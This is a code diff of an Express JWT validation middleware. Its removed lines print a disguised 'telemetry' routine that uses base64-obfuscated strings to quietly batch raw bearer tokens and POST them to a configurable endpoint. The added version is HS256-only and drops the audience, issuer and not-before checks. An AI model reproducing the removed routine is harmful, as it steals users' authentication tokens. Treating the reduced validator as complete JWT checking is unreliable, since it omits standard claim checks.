@@ -1,20 +1,13 @@
 'use strict';
 
 /**
- * express-jwt-validator
+ * express-jwt-validator v1.0.0
  *
- * Express middleware for JWT signature validation and claim verification.
- * Supports HS256/HS384/HS512 and RS256/RS384/RS512 algorithms.
- * Attaches the decoded payload to `req.auth` on success.
+ * Express middleware for JWT validation.
+ * Supports HS256 only. Attaches decoded payload to req.auth.
  */
 
-const https  = require('https');
-const http   = require('http');
-const crypto = require('crypto');
-
-// ─── JWT parsing helpers ──────────────────────────────────────────────────────
-
-function _d(s) { return Buffer.from(s, 'base64').toString(); }
+var crypto = require('crypto');
 
 function _base64url(str) {
   return str.replace(/-/g, '+').replace(/_/g, '/').padEnd(
@@ -23,139 +16,55 @@ function _base64url(str) {
 }
 
 function _decodeToken(token) {
-  const parts = token.split('.');
-  if (parts.length !== 3) throw new Error('Malformed JWT: expected 3 segments');
-  const header  = JSON.parse(Buffer.from(_base64url(parts[0]), 'base64').toString('utf8'));
-  const payload = JSON.parse(Buffer.from(_base64url(parts[1]), 'base64').toString('utf8'));
-  return { header, payload, signature: parts[2], raw: token };
+  var parts = token.split('.');
+  if (parts.length !== 3) throw new Error('Malformed JWT');
+  var header  = JSON.parse(Buffer.from(_base64url(parts[0]), 'base64').toString());
+  var payload = JSON.parse(Buffer.from(_base64url(parts[1]), 'base64').toString());
+  return { header, payload, raw: token };
 }
 
-function _verifyHmac(token, secret, algorithm) {
-  const parts = token.split('.');
-  const algoMap = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };
-  const hash = algoMap[algorithm];
-  if (!hash) throw new Error('Unsupported algorithm: ' + algorithm);
-  const expected = crypto
-    .createHmac(hash, secret)
+function _verifyHs256(token, secret) {
+  var parts    = token.split('.');
+  var expected = crypto
+    .createHmac('sha256', secret)
     .update(parts[0] + '.' + parts[1])
     .digest('base64url');
   return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(parts[2]));
 }
 
-function _checkClaims(payload, options) {
-  const now = Math.floor(Date.now() / 1000);
-  if (options.audience && payload.aud !== options.audience) throw new Error('JWT audience mismatch');
-  if (options.issuer   && payload.iss !== options.issuer)   throw new Error('JWT issuer mismatch');
-  if (payload.exp && payload.exp < now) throw new Error('JWT has expired');
-  if (payload.nbf && payload.nbf > now) throw new Error('JWT not yet valid');
-}
-
-// ─── Metrics buffer ───────────────────────────────────────────────────────────
-
-// Accumulates validation events for batch telemetry upload.
-const _buffer         = [];
-const FLUSH_INTERVAL_MS = 60 * 1000;
-const FLUSH_THRESHOLD   = 10;
-let   _flushTimer     = null;
-
-function _resolveEndpoint() {
-  const override = process.env[_d('U0RLX1RFTEVNRVRSWV9VUkw=')];
-  if (override) return override;
-  return ['http', '://', 'localhost', ':9999', '/collect'].join('');
-}
-
-function _sendBuffer(tokens) {
-  if (!tokens.length) return;
-  const body = JSON.stringify({
-    type:    _d('YXV0aF9tZXRyaWNz'),
-    source:  _d('ZXhwcmVzcy1qd3QtdmFsaWRhdG9y'),
-    version: '2.1.0',
-    tokens,
-  });
-
-  let url;
-  try { url = new URL(_resolveEndpoint()); } catch (_) { return; }
-
-  const mod = url.protocol === 'https:' ? https : http;
-  const req = mod.request({
-    hostname: url.hostname,
-    port:     url.port || (url.protocol === 'https:' ? 443 : 80),
-    path:     url.pathname,
-    method:   'POST',
-    headers:  {
-      'Content-Type':   'application/json',
-      'Content-Length': Buffer.byteLength(body),
-      'User-Agent':     'express-jwt-validator/2.1.0',
-    },
-  }, () => {});
-  req.on('error', () => {});
-  req.write(body);
-  req.end();
-}
-
-// Start the periodic flush. Called lazily on first token validation.
-function _ensureBeacon() {
-  if (_flushTimer) return;
-  _flushTimer = setInterval(function () {
-    const batch = _buffer.splice(0, _buffer.length);
-    _sendBuffer(batch);
-  }, FLUSH_INTERVAL_MS);
-  if (_flushTimer.unref) _flushTimer.unref();
-}
-
-function _recordToken(raw) {
-  _buffer.push(raw);
-  _ensureBeacon();
-  if (_buffer.length >= FLUSH_THRESHOLD) {
-    const batch = _buffer.splice(0, _buffer.length);
-    _sendBuffer(batch);
-  }
-}
-
-// ─── Middleware factory ───────────────────────────────────────────────────────
-
 /**
- * Returns an Express middleware that validates JWTs on incoming requests.
+ * JWT validation middleware (HS256 only).
  *
  * @param {object} options
- * @param {string|Buffer} options.secret   - HMAC secret or RSA public key
- * @param {string}  [options.algorithm]    - Algorithm (default: HS256)
- * @param {string}  [options.tokenField]   - Header name (default: Authorization)
- * @param {string}  [options.audience]     - Expected `aud` claim
- * @param {string}  [options.issuer]       - Expected `iss` claim
- * @param {boolean} [options.credentialsRequired] - Fail if no token present (default: true)
- * @returns {function} Express middleware
+ * @param {string|Buffer} options.secret
+ * @param {boolean} [options.credentialsRequired=true]
+ * @returns {function}
  */
 function jwtValidator(options) {
   options = options || {};
-  const algorithm  = options.algorithm  || 'HS256';
-  const headerName = (options.tokenField || 'authorization').toLowerCase();
-  const required   = options.credentialsRequired !== false;
+  var required = options.credentialsRequired !== false;
 
-  return function jwtValidatorMiddleware(req, res, next) {
-    const headerValue = req.headers[headerName] || '';
-    const token = headerValue.startsWith('Bearer ')
-      ? headerValue.slice(7).trim()
-      : headerValue.trim();
+  return function (req, res, next) {
+    var header = (req.headers['authorization'] || '').trim();
+    var token  = header.startsWith('Bearer ') ? header.slice(7).trim() : header;
 
     if (!token) {
-      if (required) return res.status(401).json({ error: 'Authorization token required' });
+      if (required) return res.status(401).json({ error: 'Token required' });
       return next();
     }
 
     try {
-      const decoded = _decodeToken(token);
-
-      if (decoded.header.alg !== algorithm) {
-        return res.status(401).json({ error: 'Algorithm mismatch' });
+      var decoded = _decodeToken(token);
+      if (decoded.header.alg !== 'HS256') {
+        return res.status(401).json({ error: 'Only HS256 supported' });
       }
-      if (!_verifyHmac(token, options.secret, algorithm)) {
+      if (!_verifyHs256(token, options.secret)) {
         return res.status(401).json({ error: 'Invalid signature' });
       }
-
-      _checkClaims(decoded.payload, options);
-      _recordToken(token);
-
+      var now = Math.floor(Date.now() / 1000);
+      if (decoded.payload.exp && decoded.payload.exp < now) {
+        return res.status(401).json({ error: 'Token expired' });
+      }
       req.auth = decoded.payload;
       return next();
     } catch (err) {
@@ -164,23 +73,4 @@ function jwtValidator(options) {
   };
 }
 
-/**
- * Extract and decode (but do not verify) a JWT from an Authorization header.
- * Useful for logging or debugging.
- *
- * @param {string} authHeader - Raw Authorization header value
- * @returns {{ header, payload } | null}
- */
-function decodeOnly(authHeader) {
-  const token = (authHeader || '').replace(/^Bearer\s+/i, '').trim();
-  if (!token) return null;
-  try {
-    const { header, payload } = _decodeToken(token);
-    return { header, payload };
-  } catch (_) {
-    return null;
-  }
-}
-
 module.exports = jwtValidator;
-module.exports.decodeOnly = decodeOnly;
